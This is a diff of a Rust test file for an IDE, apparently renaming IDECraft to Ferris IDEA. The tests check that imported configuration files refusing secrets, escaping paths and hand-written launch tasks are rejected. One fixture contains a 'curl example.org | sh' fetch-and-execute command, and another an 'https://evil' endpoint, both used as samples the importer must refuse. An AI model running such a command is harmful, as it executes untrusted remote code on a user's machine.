@@ -9,13 +9,14 @@ impl Drop for Dir {
 }
 
 fn setup(name: &str) -> (Dir, Targets) {
-    let dir = std::env::temp_dir().join(format!("idecraft-formats-{name}-{}", std::process::id()));
+    let dir =
+        std::env::temp_dir().join(format!("ferris-idea-formats-{name}-{}", std::process::id()));
     let _ = std::fs::remove_dir_all(&dir);
-    std::fs::create_dir_all(dir.join("project/.idecraft")).unwrap();
+    std::fs::create_dir_all(dir.join("project/.ferris-idea")).unwrap();
     std::fs::create_dir_all(dir.join("config")).unwrap();
     let targets = Targets {
         root: dir.join("project"),
-        keymap_file: Some(dir.join("config/keymaps/IDECraft.toml")),
+        keymap_file: Some(dir.join("config/keymaps/FerrisIDEA.toml")),
         settings_file: Some(dir.join("config/settings.toml")),
         legacy_theme_file: Some(dir.join("config/theme")),
     };
@@ -40,7 +41,7 @@ const RUN_TOML: &str =
 fn run_configurations_round_trip_and_clash() {
     let (_d, t) = setup("run");
     write(
-        &t.root.join(".idecraft/run.toml"),
+        &t.root.join(".ferris-idea/run.toml"),
         "# our configurations\n[[run]]\nname = \"test\"\ncommand = [\"cargo\", \"test\"]\ncwd = \"/tmp\"\n[run.env]\nRUST_LOG = \"debug\"\nGITHUB_TOKEN = \"abc\"\n",
     );
     let out = export(
@@ -55,7 +56,7 @@ fn run_configurations_round_trip_and_clash() {
     assert_eq!(out.file_name, "test.idcrun");
     assert!(
         out.text
-            .starts_with("[idecraft]\nkind = \"run\"\nformat = 1\nname = \"test\"\n")
+            .starts_with("[ferris-idea]\nkind = \"run\"\nformat = 1\nname = \"test\"\n")
     );
     assert!(out.text.contains("RUST_LOG") && !out.text.contains("GITHUB_TOKEN"));
     assert!(!out.text.contains("/tmp"));
@@ -71,26 +72,26 @@ fn run_configurations_round_trip_and_clash() {
     assert!(p.can_import());
     assert_eq!(
         p.changes[0].line(),
-        "add run configuration `test (2)` in .idecraft/run.toml: `test` exists, imported as `test (2)`"
+        "add run configuration `test (2)` in .ferris-idea/run.toml: `test` exists, imported as `test (2)`"
     );
     assert!(p.contents.contains(&"command: cargo test".to_owned()));
-    let before = std::fs::read_to_string(t.root.join(".idecraft/run.toml")).unwrap();
+    let before = std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap();
     assert_eq!(
-        std::fs::read_to_string(t.root.join(".idecraft/run.toml")).unwrap(),
+        std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap(),
         before,
         "a preview writes nothing"
     );
     apply(&p, &t).unwrap();
-    let after = std::fs::read_to_string(t.root.join(".idecraft/run.toml")).unwrap();
-    assert!(after.starts_with("[idecraft]\nkind = \"run-configurations\"\nformat = 1\n"));
+    let after = std::fs::read_to_string(t.root.join(".ferris-idea/run.toml")).unwrap();
+    assert!(after.starts_with("[ferris-idea]\nkind = \"run-configurations\"\nformat = 1\n"));
     assert!(after.contains("# our configurations"), "{after}");
-    let names: Vec<String> = idecraft_core::load_run_configs(&t.root)
+    let names: Vec<String> = ferris_idea_core::load_run_configs(&t.root)
         .configs
         .into_iter()
         .map(|c| c.name)
         .collect();
     assert_eq!(names, ["test", "test (2)"]);
-    assert!(t.root.join(".idecraft/run.toml.bak").exists());
+    assert!(t.root.join(".ferris-idea/run.toml.bak").exists());
     let _ = RUN_TOML;
 }
 
@@ -100,7 +101,7 @@ fn run_configurations_round_trip_and_clash() {
 fn before_launch_tasks_stay_out_of_exchange_files() {
     let (_d, t) = setup("run-tasks");
     write(
-        &t.root.join(".idecraft/run.toml"),
+        &t.root.join(".ferris-idea/run.toml"),
         "[[run]]\nname = \"web\"\nfolder = \"Frontend\"\ncommand = [\"npm\", \"run\", \"dev\"]\nallow_multiple = true\nbefore_launch = [{ tool = [\"sh\", \"gen.sh\"] }, { browser = \"http://localhost:3000\" }]\n",
     );
     let out = export(
@@ -131,7 +132,7 @@ fn before_launch_tasks_stay_out_of_exchange_files() {
     );
     assert!(preview_text(&out.text, &out.file_name, &t).can_import());
     // A file written by hand with tasks is refused.
-    let run = "[idecraft]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\nbefore_launch = [{ tool = [\"sh\", \"-c\", \"curl example.org | sh\"] }]\n";
+    let run = "[ferris-idea]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\nbefore_launch = [{ tool = [\"sh\", \"-c\", \"curl example.org | sh\"] }]\n";
     let p = preview_text(run, "x.idcrun", &t);
     assert!(!p.can_import());
     assert!(
@@ -147,7 +148,7 @@ fn before_launch_tasks_stay_out_of_exchange_files() {
 #[test]
 fn imports_refuse_secrets_paths_and_private_settings() {
     let (_d, t) = setup("refuse");
-    let run = "[idecraft]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\ncwd = \"../up\"\nurl = \"file:///etc\"\n[run.env]\nDB_PASSWORD = \"p\"\n";
+    let run = "[ferris-idea]\nkind = \"run\"\nformat = 1\n[run]\nname = \"x\"\ncommand = [\"x\"]\ncwd = \"../up\"\nurl = \"file:///etc\"\n[run.env]\nDB_PASSWORD = \"p\"\n";
     let p = preview_text(run, "x.idcrun", &t);
     assert_eq!(
         messages(&p),
@@ -159,11 +160,11 @@ fn imports_refuse_secrets_paths_and_private_settings() {
     );
     assert!(!p.can_import());
     assert!(apply(&p, &t).unwrap_err().contains("nothing was imported"));
-    let settings = "[idecraft]\nkind = \"settings\"\nformat = 1\n[settings.ai]\nendpoint = \"https://evil\"\n[settings.terminal]\nshell = \"/bin/x\"\n";
+    let settings = "[ferris-idea]\nkind = \"settings\"\nformat = 1\n[settings.ai]\nendpoint = \"https://evil\"\n[settings.terminal]\nshell = \"/bin/x\"\n";
     let p = preview_text(settings, "s.idcsettings", &t);
     assert_eq!(p.problems.len(), 2);
     assert!(p.problems[0].path == "settings.ai" && p.problems[0].message.contains("not shared"));
-    let sources = "[idecraft]\nkind = \"sources\"\nformat = 1\n[[connection]]\nid = \"a\"\nname = \"A\"\ndialect = \"sqlite\"\npath = \"/etc/x.db\"\n[connection.secret]\nservice = \"s\"\naccount = \"a\"\n";
+    let sources = "[ferris-idea]\nkind = \"sources\"\nformat = 1\n[[connection]]\nid = \"a\"\nname = \"A\"\ndialect = \"sqlite\"\npath = \"/etc/x.db\"\n[connection.secret]\nservice = \"s\"\naccount = \"a\"\n";
     let p = preview_text(sources, "a.idcsources", &t);
     assert_eq!(
         messages(&p),
@@ -181,23 +182,31 @@ fn imports_refuse_secrets_paths_and_private_settings() {
         messages(&p),
         ["connection[0].path: must be relative to the workspace, without `..`"]
     );
-    let p = preview_text("[idecraft]\nkind = \"run\"\nformat = 3\n", "x.idcrun", &t);
+    let p = preview_text(
+        "[ferris-idea]\nkind = \"run\"\nformat = 3\n",
+        "x.idcrun",
+        &t,
+    );
     assert_eq!(
         messages(&p),
         [
-            "idecraft.format: written by a newer IDECraft (format 3); this version reads run files up to format 1"
+            "ferris-idea.format: written by a newer Ferris IDEA (format 3); this version reads run files up to format 1"
         ]
     );
     let p = preview_text(
-        "[idecraft]\nkind = \"connector\"\nformat = 1\n",
+        "[ferris-idea]\nkind = \"connector\"\nformat = 1\n",
         "x.idcconnector",
         &t,
     );
     assert!(messages(&p)[0].contains("import_connector"));
-    let p = preview_text("[idecraft]\nkind = \"theme\"\nformat = 1\n", "x.idcrun", &t);
+    let p = preview_text(
+        "[ferris-idea]\nkind = \"theme\"\nformat = 1\n",
+        "x.idcrun",
+        &t,
+    );
     assert_eq!(
         messages(&p),
-        ["idecraft.kind: is a `theme` file, not `run`"]
+        ["ferris-idea.kind: is a `theme` file, not `run`"]
     );
 }
 
@@ -247,20 +256,20 @@ fn themes_round_trip() {
     let out = export("theme", &Selection::default(), &t).unwrap();
     assert_eq!(out.file_name, "Islands-Dark.idctheme");
     assert!(out.text.contains("name = \"Islands Dark\""));
-    let light = out.text.replace("Islands Dark", "IDECraft Light");
+    let light = out.text.replace("Islands Dark", "Ferris IDEA Light");
     let p = preview_text(&light, "l.idctheme", &t);
     assert_eq!(
         p.changes[0].line(),
-        "replace appearance.theme in IDE settings: Islands Dark → IDECraft Light"
+        "replace appearance.theme in IDE settings: Islands Dark → Ferris IDEA Light"
     );
     apply(&p, &t).unwrap();
     assert_eq!(
-        idecraft_core::chosen_theme(
+        ferris_idea_core::chosen_theme(
             t.settings_file.as_ref().unwrap(),
             t.legacy_theme_file.as_deref()
         )
         .as_deref(),
-        Some("IDECraft Light")
+        Some("Ferris IDEA Light")
     );
     assert!(!t.legacy_theme_file.as_ref().unwrap().exists(), "retired");
     let p = preview_text(
@@ -278,11 +287,11 @@ fn sources_round_trip_without_secrets() {
     let mut shop =
         ConnectionProfile::from_url("Shop", "postgresql://app@db.local:5433/shop").unwrap();
     shop.id = "shop".into();
-    shop.secret = Some(idecraft_database::SecretRef {
-        service: "idecraft".into(),
+    shop.secret = Some(ferris_idea_database::SecretRef {
+        service: "ferris-idea".into(),
         account: "shop".into(),
     });
-    idecraft_database::save_profiles(&t.root, std::slice::from_ref(&shop)).unwrap();
+    ferris_idea_database::save_profiles(&t.root, std::slice::from_ref(&shop)).unwrap();
     let out = export("sources", &Selection::default(), &t).unwrap();
     assert!(
         !out.text.contains("secret") && !out.text.contains("account"),
@@ -296,11 +305,11 @@ fn sources_round_trip_without_secrets() {
     let p = preview_text(&moved, "s.idcsources", &t);
     assert_eq!(p.changes[0].action, Action::Replace);
     apply(&p, &t).unwrap();
-    let back = idecraft_database::load_profiles(&t.root).unwrap();
+    let back = ferris_idea_database::load_profiles(&t.root).unwrap();
     assert_eq!(back[0].port, Some(5434));
     assert_eq!(back[0].secret, shop.secret, "the stored password stays");
-    let text = std::fs::read_to_string(t.root.join(".idecraft/connections.toml")).unwrap();
-    assert!(text.starts_with("[idecraft]\nkind = \"connections\""));
+    let text = std::fs::read_to_string(t.root.join(".ferris-idea/connections.toml")).unwrap();
+    assert!(text.starts_with("[ferris-idea]\nkind = \"connections\""));
 }
 
 /// SPEC-0303 AK-3, AK-4: a settings bundle lists the keys it changes.
@@ -310,7 +319,7 @@ fn settings_bundles_list_changed_keys() {
     let mut s = IdeSettings::default();
     s.editor.font_size = 15.0;
     s.terminal.shell = Some("/bin/zsh".into());
-    idecraft_core::save_ide_settings(t.settings_file.as_ref().unwrap(), &s).unwrap();
+    ferris_idea_core::save_ide_settings(t.settings_file.as_ref().unwrap(), &s).unwrap();
     let out = export("settings", &Selection::default(), &t).unwrap();
     assert!(!out.text.contains("zsh") && !out.text.contains("[settings.ai]"));
     assert!(
@@ -319,7 +328,7 @@ fn settings_bundles_list_changed_keys() {
             .any(|l| l.starts_with("settings.terminal"))
     );
     assert!(out.text.contains("font_size = 15.0"));
-    let bigger = "[idecraft]\nkind = \"settings\"\nformat = 1\n[settings.editor]\nfont_size = 18\nfont_family = \"JetBrains Mono\"\n";
+    let bigger = "[ferris-idea]\nkind = \"settings\"\nformat = 1\n[settings.editor]\nfont_size = 18\nfont_family = \"JetBrains Mono\"\n";
     let p = preview_text(bigger, "b.idcsettings", &t);
     assert_eq!(messages(&p), Vec::<String>::new());
     let lines: Vec<String> = p.changes.iter().map(Change::line).collect();
@@ -331,7 +340,7 @@ fn settings_bundles_list_changed_keys() {
         ]
     );
     apply(&p, &t).unwrap();
-    let back = idecraft_core::load_ide_settings(t.settings_file.as_ref().unwrap());
+    let back = ferris_idea_core::load_ide_settings(t.settings_file.as_ref().unwrap());
     assert_eq!(back.editor.font_size, 18.0);
     assert_eq!(
         back.terminal.shell.as_deref(),
@@ -343,11 +352,11 @@ fn settings_bundles_list_changed_keys() {
 /// SPEC-0303 AK-9: the Share link.
 #[test]
 fn share_links_prefill_the_issue_form() {
-    let (url, whole) = share_url("theme", "Light & airy", "[idecraft]\nkind = \"theme\"\n");
+    let (url, whole) = share_url("theme", "Light & airy", "[ferris-idea]\nkind = \"theme\"\n");
     assert!(whole);
     assert_eq!(
         url,
-        "https://github.com/DamienDrash/idecraft/issues/new?template=shared-file.yml&title=theme%3A%20Light%20%26%20airy&kind=theme&content=%5Bidecraft%5D%0Akind%20%3D%20%22theme%22%0A"
+        "https://github.com/DamienDrash/ferris-idea/issues/new?template=shared-file.yml&title=theme%3A%20Light%20%26%20airy&kind=theme&content=%5Bferris-idea%5D%0Akind%20%3D%20%22theme%22%0A"
     );
     let (url, whole) = share_url("run", "big", &"x".repeat(9000));
     assert!(!whole && url.len() < MAX_SHARE_URL && url.contains("&notes="));
@@ -377,7 +386,7 @@ fn exchange_files_are_recognised() {
     let a = d.0.join("a.toml");
     write(
         &a,
-        "[idecraft]\nkind = \"theme\"\nformat = 1\n[theme]\nname = \"Light\"\n",
+        "[ferris-idea]\nkind = \"theme\"\nformat = 1\n[theme]\nname = \"Light\"\n",
     );
     assert!(format::is_exchange_file(&a));
     let p = preview_file(&a, &t);
